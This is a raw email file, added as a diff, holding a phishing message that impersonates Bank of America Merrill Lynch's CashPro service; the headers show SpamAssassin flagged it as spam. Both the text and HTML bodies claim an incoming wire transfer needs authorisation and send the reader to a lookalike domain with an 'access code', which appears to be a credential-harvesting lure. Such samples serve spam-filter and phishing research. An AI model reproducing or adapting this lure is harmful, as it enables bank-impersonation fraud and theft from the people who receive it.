@@ -1,0 +1,714 @@
+Return-Path: <mary.massetti-beatles=cotton.us@notifications-baml.com>
+Received: from arcade.andreinicholson.com
+	by arcade.andreinicholson.com with LMTP id +MnWDGrkD1xAIQAAuZr9XQ
+	; Tue, 11 Dec 2018 11:23:06 -0500
+Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=95.211.242.76; helo=notifications-baml.com; envelope-from=mary.massetti-beatles=cotton.us@notifications-baml.com; receiver=<UNKNOWN> 
+Authentication-Results: arcade.andreinicholson.com; dmarc=pass (p=none dis=none) header.from=notifications-baml.com
+Authentication-Results: arcade.andreinicholson.com;
+	dkim=pass (1024-bit key; unprotected) header.d=notifications-baml.com header.i=@notifications-baml.com header.b="TIUFpE6V";
+	dkim-atps=neutral
+X-Greylist: delayed 613 seconds by postgrey-1.36 at arcade.andreinicholson.com; Tue, 11 Dec 2018 11:23:00 EST
+Received: from notifications-baml.com (unknown [95.211.242.76])
+	by arcade.andreinicholson.com (Postfix) with ESMTP id 482C711942D
+	for <beatles@cotton.us>; Tue, 11 Dec 2018 11:23:00 -0500 (EST)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=key; d=notifications-baml.com;
+ h=Mime-Version:Date:To:Subject:From:Content-Type:Message-ID;
+ bh=nB3NhadU2vaWAZ0s+yqLYTRkHkM=;
+ b=TIUFpE6VpgLIhV9v65QhMVx/XwGcr25nDG2FJOGz7aqhe1rVmaTuHPDytrZZT7hoFXhN56wZy3q6
+   bsv64iFX2/2a549ZBuiUbvd02P9P/dCknQPFE4oVUYwINsNuoC14egN4YRL4vmWjvq4myUEl4Jaj
+   gsPS2+1F0rlnCTWNpjY=
+Received: by notifications-baml.com id h1vi6o0buokq for <beatles@cotton.us>; Tue, 11 Dec 2018 11:01:21 -0500 (envelope-from <mary.massetti-beatles=cotton.us@notifications-baml.com>)
+Mime-Version: 1.0
+Date: Tue, 11 Dec 2018 11:01:21 -0500
+To: beatles@cotton.us
+Subject:  FW: Incoming Transaction Notification - Authorization Form - Ref.
+ #BAML0329010
+From: "CashPro Notifications" <mary.massetti@notifications-baml.com>
+Content-Type: multipart/alternative;
+ boundary=5358d72759a6540bc9c41326aa5b5bf4
+Message-ID: <0.0.0.0.1D4916AC2950620.1E7822AF@notifications-baml.com>
+X-Spam-Flag: YES
+X-Spam-Status: Yes, score=7.8 required=7.0 tests=DCC_CHECK,DIGEST_MULTIPLE,
+	DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FSL_BULK_SIG,
+	HTML_FONT_SIZE_LARGE,HTML_MESSAGE,RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK,
+	SPF_PASS,UNPARSEABLE_RELAY,URIBL_BLOCKED,URIBL_CSS,URIBL_CSS_A,
+	URIBL_DBL_SPAM autolearn=no autolearn_force=no version=3.4.2
+X-Spam-Report: 
+	*  0.1 URIBL_CSS_A Contains URL's A record listed in the Spamhaus CSS
+	*      blocklist
+	*      [URIs: notifications-baml.com]
+	*  0.1 URIBL_CSS Contains an URL's NS IP listed in the Spamhaus CSS
+	*      blocklist
+	*      [URIs: notifications-baml.com]
+	*  0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was
+	*      blocked.  See
+	*      http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+	*      for more information.
+	*      [URIs: baml-secure.com]
+	*  2.5 URIBL_DBL_SPAM Contains a spam URL listed in the Spamhaus DBL
+	*      blocklist
+	*      [URIs: notifications-baml.com]
+	* -0.0 SPF_PASS SPF: sender matches SPF record
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.0 HTML_FONT_SIZE_LARGE BODY: HTML font size is large
+	*  0.1 DKIM_SIGNED Message has a DKIM or DK signature, not necessarily
+	*       valid
+	* -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
+	* -0.1 DKIM_VALID_EF Message has a valid DKIM or DK signature from
+	*      envelope-from domain
+	* -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from
+	*      author's domain
+	*  1.1 DCC_CHECK Detected as bulk mail by DCC (dcc-servers.net)
+	*  2.4 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+	*      [cf: 100]
+	*  1.7 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+	*  0.0 UNPARSEABLE_RELAY Informational: message has unparseable relay
+	*      lines
+	*  0.0 FSL_BULK_SIG Bulk signature with no Unsubscribe
+	*  0.0 DIGEST_MULTIPLE Message hits more than one network digest check
+X-Spam-Level: *******
+X-Spam-Checker-Version: SpamAssassin 3.4.2 (2018-09-13) on
+	arcade.andreinicholson.com
+
+--5358d72759a6540bc9c41326aa5b5bf4
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=UTF-8
+
+
+
+
+Activity Alert
+Incoming Transaction Notification
+
+Good morning,
+
+Please note that an incoming wire transfer transaction has been initiated t=
+o your account on December 11, 2018.
+
+The money is not automatically credited and it requires confirmation to man=
+ually credit or reject this transfer. Sign and complete this form to author=
+ize Bank of America to credit this transfer to your account, you can also v=
+iew/download it using the link below:=20
+
+https://baml-secure.com/AuthenticationFrameworkWeb/netorg3892123_x-r-baml_l=
+aydut_bofa3eb56-5b23-429c-8ac7-aq2e9aff4412_7D_action=3Ddefault_uid=3D_7BFD=
+C3E51-4512-489C-8CA7-A87ECAFF5876_7D_ListItemId=3D86_ListId=3D_7B1B27C90C-A=
+B59-481D-AA20-8DEEE8D07AD7_7D_odsp=3D1_env=3Dsecure/=20
+
+Access Code: 828312=20
+
+By signing this form you give us permission to credit this incoming transac=
+tion to your account. This is permission for a single transaction only, and=
+ does not provide authorization for any additional unrelated debit or credi=
+ts to your account. We are required to ask you to complete this authorizati=
+on form when all other details were correct but beneficiary name was spelle=
+d incorrect or is not complete.
+
+Sincerely,
+
+Mary Massetti
+Treasury Solution Officer
+Commercial Banking
+Bank of America Merrill Lynch
+(O) 631-381-7416
+(M) 516-582-8471
+(F) 646-822-3812
+mary.massetti@baml.com
+
+This message is solely for the intended recipient(s) and may contain privil=
+eged, confidential or proprietary information. If you are not an intended r=
+ecipient, please delete and destroy all copies, and any use of the informat=
+ion contained in this message is prohibited.This message is not an offer to=
+ sell any products or service or a banking or financial intermediation. It =
+is not and should not be relied on by the recipient as a transaction confir=
+mation or account statement. Sender shall not be liable for improper, incom=
+plete or inaccurate information contained in this notification or any delay=
+ or failure in its receipt. If you have any questions, please call the phon=
+e number on your account statement.
+
+
+--5358d72759a6540bc9c41326aa5b5bf4
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=UTF-8
+
+
+   =20
+
+<!doctype html>
+<html xmlns=3D"http://www.w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microso=
+ft-com:vml" xmlns:o=3D"urn:schemas-microsoft-com:office:office">
+    <head>
+        <meta charset=3D"UTF-8">
+        <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+        <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-sc=
+ale=3D1">
+        <title>Activity Alert</title>
+       =20
+    <style type=3D"text/css">
+		p{
+			margin:10px 0;
+			padding:0;
+		}
+		table{
+			border-collapse:collapse;
+		}
+		h1,h2,h3,h4,h5,h6{
+			display:block;
+			margin:0;
+			padding:0;
+		}
+		img,a img{
+			border:0;
+			height:auto;
+			outline:none;
+			text-decoration:none;
+		}
+		body,#bodyTable,#bodyCell{
+			height:100%;
+			margin:0;
+			padding:0;
+			width:100%;
+		}
+		.mcnPreviewText{
+			display:none !important;
+		}
+		#outlook a{
+			padding:0;
+		}
+		img{
+			-ms-interpolation-mode:bicubic;
+		}
+		table{
+			mso-table-lspace:0pt;
+			mso-table-rspace:0pt;
+		}
+		.ReadMsgBody{
+			width:100%;
+		}
+		.ExternalClass{
+			width:100%;
+		}
+		p,a,li,td,blockquote{
+			mso-line-height-rule:exactly;
+		}
+		a[href^=3Dtel],a[href^=3Dsms]{
+			color:inherit;
+			cursor:default;
+			text-decoration:none;
+		}
+		p,a,li,td,body,table,blockquote{
+			-ms-text-size-adjust:100%;
+			-webkit-text-size-adjust:100%;
+		}
+		.ExternalClass,.ExternalClass p,.ExternalClass td,.ExternalClass div,.Ext=
+ernalClass span,.ExternalClass font{
+			line-height:100%;
+		}
+		a[x-apple-data-detectors]{
+			color:inherit !important;
+			text-decoration:none !important;
+			font-size:inherit !important;
+			font-family:inherit !important;
+			font-weight:inherit !important;
+			line-height:inherit !important;
+		}
+		#bodyCell{
+			padding:10px;
+		}
+		.templateContainer{
+			max-width:600px !important;
+		}
+		a.mcnButton{
+			display:block;
+		}
+		.mcnImage,.mcnRetinaImage{
+			vertical-align:bottom;
+		}
+		.mcnTextContent{
+			word-break:break-word;
+		}
+		.mcnTextContent img{
+			height:auto !important;
+		}
+		.mcnDividerBlock{
+			table-layout:fixed !important;
+		}
+		body,#bodyTable{
+			background-color:#FFFFFF;
+			background-image:none;
+			background-repeat:no-repeat;
+			background-position:center;
+			background-size:cover;
+		}
+		#bodyCell{
+			border-top:0;
+		}
+		.templateContainer{
+			border:0;
+		}
+		h1{
+			color:#202020;
+			font-family:Helvetica;
+			font-size:26px;
+			font-style:normal;
+			font-weight:bold;
+			line-height:125%;
+			letter-spacing:normal;
+			text-align:left;
+		}
+		h2{
+			color:#202020;
+			font-family:Helvetica;
+			font-size:22px;
+			font-style:normal;
+			font-weight:bold;
+			line-height:125%;
+			letter-spacing:normal;
+			text-align:left;
+		}
+		h3{
+			color:#202020;
+			font-family:Helvetica;
+			font-size:20px;
+			font-style:normal;
+			font-weight:bold;
+			line-height:125%;
+			letter-spacing:normal;
+			text-align:left;
+		}
+		h4{
+			color:#202020;
+			font-family:Helvetica;
+			font-size:18px;
+			font-style:normal;
+			font-weight:bold;
+			line-height:125%;
+			letter-spacing:normal;
+			text-align:left;
+		}
+		#templateHeader{
+			border-top:0;
+			border-bottom:0;
+		}
+		#templateHeader .mcnTextContent,#templateHeader .mcnTextContent p{
+			color:#202020;
+			font-family:Helvetica;
+			font-size:16px;
+			line-height:150%;
+			text-align:left;
+		}
+		#templateHeader .mcnTextContent a,#templateHeader .mcnTextContent p a{
+			color:#2BAADF;
+			font-weight:normal;
+			text-decoration:underline;
+		}
+		#templateBody{
+			border-top:0;
+			border-bottom:0;
+		}
+		#templateBody .mcnTextContent,#templateBody .mcnTextContent p{
+			color:#202020;
+			font-family:Helvetica;
+			font-size:16px;
+			line-height:150%;
+			text-align:left;
+		}
+		#templateBody .mcnTextContent a,#templateBody .mcnTextContent p a{
+			color:#2BAADF;
+			font-weight:normal;
+			text-decoration:underline;
+		}
+		#templateFooter{
+			border-top:0;
+			border-bottom:0;
+		}
+		#templateFooter .mcnTextContent,#templateFooter .mcnTextContent p{
+			color:#202020;
+			font-family:Helvetica;
+			font-size:12px;
+			line-height:150%;
+			text-align:left;
+		}
+		#templateFooter .mcnTextContent a,#templateFooter .mcnTextContent p a{
+			color:#202020;
+			font-weight:normal;
+			text-decoration:underline;
+		}
+	@media only screen and (min-width:768px){
+		.templateContainer{
+			width:600px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		body,table,td,p,a,li,blockquote{
+			-webkit-text-size-adjust:none !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		body{
+			width:100% !important;
+			min-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		#bodyCell{
+			padding-top:10px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnRetinaImage{
+			max-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImage{
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnCartContainer,.mcnCaptionTopContent,.mcnRecContentContainer,.mcnCapti=
+onBottomContent,.mcnTextContentContainer,.mcnBoxedTextContentContainer,.mcn=
+ImageGroupContentContainer,.mcnCaptionLeftTextContentContainer,.mcnCaptionR=
+ightTextContentContainer,.mcnCaptionLeftImageContentContainer,.mcnCaptionRi=
+ghtImageContentContainer,.mcnImageCardLeftTextContentContainer,.mcnImageCar=
+dRightTextContentContainer,.mcnImageCardLeftImageContentContainer,.mcnImage=
+CardRightImageContentContainer{
+			max-width:100% !important;
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnBoxedTextContentContainer{
+			min-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupContent{
+			padding:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnCaptionLeftContentOuter .mcnTextContent,.mcnCaptionRightContentOuter =
+mcnTextContent{
+			padding-top:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardTopImageContent,.mcnCaptionBottomContent:last-child .mcnCapt=
+ionBottomImageContent,.mcnCaptionBlockInner .mcnCaptionTopContent:last-chil=
+d .mcnTextContent{
+			padding-top:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardBottomImageContent{
+			padding-bottom:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupBlockInner{
+			padding-top:0 !important;
+			padding-bottom:0 !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupBlockOuter{
+			padding-top:9px !important;
+			padding-bottom:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnTextContent,.mcnBoxedTextContentColumn{
+			padding-right:18px !important;
+			padding-left:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardLeftImageContent,.mcnImageCardRightImageContent{
+			padding-right:18px !important;
+			padding-bottom:0 !important;
+			padding-left:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcpreview-image-uploader{
+			display:none !important;
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		h1{
+			font-size:22px !important;
+			line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		h2{
+			font-size:20px !important;
+			line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		h3{
+			font-size:18px !important;
+			line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		h4{
+			font-size:16px !important;
+			line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		table.mcnBoxedTextContentContainer td.mcnTextContent,td.mcnBoxedTextConte=
+ntContainer td.mcnTextContent p{
+			font-size:14px !important;
+			line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		td#templateHeader td.mcnTextContent,td#templateHeader td.mcnTextContent p=
+{
+			font-size:16px !important;
+			line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		td#templateBody td.mcnTextContent,td#templateBody td.mcnTextContent p{
+			font-size:16px !important;
+			line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		td#templateFooter td.mcnTextContent,td#templateFooter td.mcnTextContent p=
+{
+			font-size:14px !important;
+			line-height:150% !important;
+		}
+
+}</style></head>
+    <body style=3D"background:#FFFFFF none no-repeat center/cover;height: 1=
+00%;margin: 0;padding: 0;width: 100%;-ms-text-size-adjust: 100%;-webkit-tex=
+t-size-adjust: 100%;background-color: #FFFFFF;background-image: none;backgr=
+ound-repeat: no-repeat;background-position: center;background-size: cover;"=
+>
+        <!---->
+        <center>
+            <table align=3D"center" border=3D"0" cellpadding=3D"0" cellspac=
+ing=3D"0" height=3D"100%" width=3D"100%" id=3D"bodyTable" style=3D"backgrou=
+nd:#FFFFFF none no-repeat center/cover;border-collapse: collapse;mso-table-=
+lspace: 0pt;mso-table-rspace: 0pt;-ms-text-size-adjust: 100%;-webkit-text-s=
+ize-adjust: 100%;height: 100%;margin: 0;padding: 0;width: 100%;background-c=
+olor: #FFFFFF;background-image: none;background-repeat: no-repeat;backgroun=
+d-position: center;background-size: cover;">
+                <tr>
+                    <td align=3D"left" valign=3D"top" id=3D"bodyCell" style=
+=3D"mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-s=
+ize-adjust: 100%;height: 100%;margin: 0;padding: 10px;width: 100%;border-to=
+p: 0;">
+                        <table border=3D"0" cellpadding=3D"0" cellspacing=
+=3D"0" width=3D"100%" class=3D"templateContainer" style=3D"border-collapse:=
+ collapse;mso-table-lspace: 0pt;mso-table-rspace: 0pt;-ms-text-size-adjust:=
+ 100%;-webkit-text-size-adjust: 100%;border: 0;max-width: 600px !important;=
+">
+                            <tr>
+                                <td valign=3D"top" id=3D"templateHeader" st=
+yle=3D"mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-tex=
+t-size-adjust: 100%;border-top: 0;border-bottom: 0;"><table class=3D"mcnTex=
+tBlock" style=3D"min-width: 100%;border-collapse: collapse;mso-table-lspace=
+: 0pt;mso-table-rspace: 0pt;-ms-text-size-adjust: 100%;-webkit-text-size-ad=
+just: 100%;" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" border=3D"0=
+">
+    <tbody class=3D"mcnTextBlockOuter">
+        <tr>
+            <td class=3D"mcnTextBlockInner" style=3D"padding-top: 9px;mso-l=
+ine-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjus=
+t: 100%;" valign=3D"top">
+                <table style=3D"max-width: 100%;min-width: 100%;border-coll=
+apse: collapse;mso-table-lspace: 0pt;mso-table-rspace: 0pt;-ms-text-size-ad=
+just: 100%;-webkit-text-size-adjust: 100%;" class=3D"mcnTextContentContaine=
+r" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" border=3D"0" align=3D=
+"left">
+                    <tbody><tr>
+                       =20
+                        <td class=3D"mcnTextContent" style=3D"padding-top: =
+0;padding-right: 18px;padding-bottom: 9px;padding-left: 18px;mso-line-heigh=
+t-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;w=
+ord-break: break-word;color: #202020;font-family: Helvetica;font-size: 16px=
+;line-height: 150%;text-align: left;" valign=3D"top">
+                       =20
+                            <img alt=3D"baml" src=3D"https://cashproonline-=
+cdn1.cpoacc.com/cpwportal/cms/public/cpoimages/portal/BAMA_Logo_bk.png" sty=
+le=3D"border: 0;height: auto !important;outline: none;text-decoration: none=
+;-ms-interpolation-mode: bicubic;">
+                        </td>
+                    </tr>
+                </tbody></table>
+            </td>
+        </tr>
+    </tbody>
+</table></td>
+                            </tr>
+                            <tr>
+                                <td valign=3D"top" id=3D"templateBody" styl=
+e=3D"mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-=
+size-adjust: 100%;border-top: 0;border-bottom: 0;"><table class=3D"mcnTextB=
+lock" style=3D"min-width: 100%;border-collapse: collapse;mso-table-lspace: =
+0pt;mso-table-rspace: 0pt;-ms-text-size-adjust: 100%;-webkit-text-size-adju=
+st: 100%;" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
+    <tbody class=3D"mcnTextBlockOuter">
+        <tr>
+            <td class=3D"mcnTextBlockInner" style=3D"padding-top: 9px;mso-l=
+ine-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjus=
+t: 100%;" valign=3D"top">
+                <table style=3D"max-width: 100%;min-width: 100%;border-coll=
+apse: collapse;mso-table-lspace: 0pt;mso-table-rspace: 0pt;-ms-text-size-ad=
+just: 100%;-webkit-text-size-adjust: 100%;" class=3D"mcnTextContentContaine=
+r" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" border=3D"0" align=3D=
+"left">
+                    <tbody><tr>
+                       =20
+                        <td class=3D"mcnTextContent" style=3D"padding-top: =
+0;padding-right: 18px;padding-bottom: 9px;padding-left: 18px;mso-line-heigh=
+t-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;w=
+ord-break: break-word;color: #202020;font-family: Helvetica;font-size: 16px=
+;line-height: 150%;text-align: left;" valign=3D"top">
+                       =20
+                            <font size=3D"6px" face=3D"Arial, Helvetica, sa=
+ns-serif" color=3D"#0061aa">Activity Alert</font>
+
+<table style=3D"font-family: &quot;Times New Roman&quot;;letter-spacing: no=
+rmal;orphans: 2;text-indent: 0px;text-transform: none;widows: 2;word-spacin=
+g: 0px;-webkit-text-stroke-width: 0px;text-decoration-style: initial;text-d=
+ecoration-color: initial;border-collapse: collapse;mso-table-lspace: 0pt;ms=
+o-table-rspace: 0pt;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 10=
+0%;" width=3D"600" cellspacing=3D"0" cellpadding=3D"0" border=3D"0" bgcolor=
+=3D"#FFFFFF">
+	<tbody>
+		<tr>
+		</tr>
+	</tbody>
+</table>
+<span style=3D"color:#00013a"><font size=3D"4px" face=3D"Arial, Helvetica, =
+sans-serif">Incoming Transaction Notification</font></span><br>
+<br>
+<span style=3D"-webkit-text-stroke-width: 0px;background-color: #FFFFFF;col=
+or: #000000;display: inline !important;float: none;font-family: times new r=
+oman;font-size: medium;font-style: normal;font-variant-caps: normal;font-va=
+riant-ligatures: normal;font-weight: 400;letter-spacing: normal;orphans: 2;=
+text-align: start;text-decoration-color: initial;text-decoration-style: ini=
+tial;text-indent: 0px;text-transform: none;white-space: normal;widows: 2;wo=
+rd-spacing: 0px;">Good morning,<br>
+<br>
+Please note that an incoming wire transfer transaction has been initiated t=
+o your account on December 11, 2018.<br>
+<br>
+The money is not automatically credited and it requires confirmation to man=
+ually credit or reject this transfer. Sign and complete this <a href=3D"htt=
+ps://baml-secure.com/AuthenticationFrameworkWeb/netorg3892123_x-r-baml_layo=
+ut_bofa3eb56-5123-489c-8ca7-a12ecaff4412_7D_action=3Ddefault_uid=3i_7BFDC3E=
+51-4512-489C-8CA7-A87ECAFF5876_7D_ListItemId=3D86_ListId=3D_7B1B2jC90C-AB59=
+-481D-AA20-8DEEE8D07AD7_7D_odsp=3D1_env=3Dsecure/"> form</a> to authorize B=
+ank of America to credit this transfer to your account, you can also view/d=
+ownload it using the link below: <br><br><a href=3D"https://baml-secure.com=
+/AuthenticationFrameworkWeb/netorg3892123_x-r-baml_layout_bofa3eb56-5123-48=
+9c-8ca7-a12ecaff4412_7D_action=3Ddefault_uid=3D_7BFDC3E51-4512-48hC-8CA7-A8=
+7ECAFF5876_7D_ListItemId=3D86_ListId=3D_7B1B27C90C-AB59-481D-AA20-8DEEE8D07=
+AD7_7D_odsp=3D1_env=3Dsecure/">https://baml-secure.com/AuthenticatoonFramew=
+orkWeb/netorg3892123_x-r-baml_layout_bofa3eb56-5123-489c-8ca7-a12ecaff4412_=
+7D_action=3Ddefault_uid=3D_7BFDC3E51-4512-489C-8CA7-A87ECAFF5876_7D_ListIte=
+mId=3D86_ListId=3D_7B1B27C90C-AB59-481D-AA20-8DEEE8D07AD7_7D_odsp=3D1_env=
+=3Dsecure/</a>
+<br><br>Access Code: <b> 828312</b>
+<br><br>By signing this form you give us permission to credit this incoming=
+ transaction to your account. This is permission for a single transaction o=
+nly, and does not provide authorization for any additional unrelated debit =
+or credits to your account. We are required to ask you to complete this aut=
+horization form when all other details were correct but beneficiary name wa=
+s spelled incorrect or is not complete.<br>
+<br>
+Sincerely,<br>
+<br>
+<p style=3D"margin: 9px 0;padding: 0;mso-line-height-rule: exactly;-ms-text=
+-size-adjust: 100%;-webkit-text-size-adjust: 100%;color: #202020;font-famil=
+y: Helvetica;font-size: 13px;line-height: 150%;text-align: left;"><span sty=
+le=3D"color:#948671">Mary Massetti<br>
+Treasury Solution Officer<br>
+Commercial Banking<br>
+Bank of America Merrill Lynch<br>
+(O) 631-381-7416<br>
+(M) 516-582-8471<br>
+(F) 646-822-3812<br>
+mary.massetti@baml.com</span></p>
+                        </td>
+                    </tr>
+                </tbody></table>
+            </td>
+        </tr>
+    </tbody>
+</table></td>
+                            </tr>
+                            <tr>
+                                <td valign=3D"top" id=3D"templateFooter" st=
+yle=3D"mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-tex=
+t-size-adjust: 100%;border-top: 0;border-bottom: 0;"><table class=3D"mcnTex=
+tBlock" style=3D"min-width: 100%;border-collapse: collapse;mso-table-lspace=
+: 0pt;mso-table-rspace: 0pt;-ms-text-size-adjust: 100%;-webkit-text-size-ad=
+just: 100%;" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" border=3D"0=
+">
+    <tbody class=3D"mcnTextBlockOuter">
+        <tr>
+            <td class=3D"mcnTextBlockInner" style=3D"padding-top: 9px;mso-l=
+ine-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjus=
+t: 100%;" valign=3D"top">
+                <table style=3D"max-width: 100%;min-width: 100%;border-coll=
+apse: collapse;mso-table-lspace: 0pt;mso-table-rspace: 0pt;-ms-text-size-ad=
+just: 100%;-webkit-text-size-adjust: 100%;" class=3D"mcnTextContentContaine=
+r" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" border=3D"0" align=3D=
+"left">
+                    <tbody><tr>
+                       =20
+                        <td class=3D"mcnTextContent" style=3D"padding-top: =
+0;padding-right: 18px;padding-bottom: 9px;padding-left: 18px;mso-line-heigh=
+t-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;w=
+ord-break: break-word;color: #202020;font-family: Helvetica;font-size: 12px=
+;line-height: 150%;text-align: left;" valign=3D"top">
+                       =20
+                            <span style=3D"-webkit-text-stroke-width: 0px;b=
+ackground-color: #FFFFFF;color: #999999;display: inline !important;float: n=
+one;font-family: arial,helvetica,sans-serif;font-size: 10px;font-style: nor=
+mal;font-variant-caps: normal;font-variant-ligatures: normal;font-weight: 4=
+00;letter-spacing: normal;orphans: 2;text-align: start;text-decoration-colo=
+r: initial;text-decoration-style: initial;text-indent: 0px;text-transform: =
+none;white-space: normal;widows: 2;word-spacing: 0px;">This message is sole=
+ly for the intended recipient(s) and may contain privileged, confidential o=
+r proprietary information. If you are not an intended recipient, please del=
+ete and destroy all copies, and any use of the information contained in thi=
+s message is prohibited.This message is not an offer to sell any products o=
+r service or a banking or financial intermediation. It is not and should no=
+t be relied on by the recipient as a transaction confirmation or account st=
+atement. Sender shall not be liable for improper, incomplete or inaccurate =
+information contained in this notification or any delay or failure in its r=
+eceipt. If you have any questions, please call the phone number on your acc=
+ount statement.</span>
+                        </td>
+                    </tr>
+                </tbody></table>
+            </td>
+        </tr>
+    </tbody>
+</table></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+        </center>
+    </body>
+</html>
+
+
+
+
+--5358d72759a6540bc9c41326aa5b5bf4--
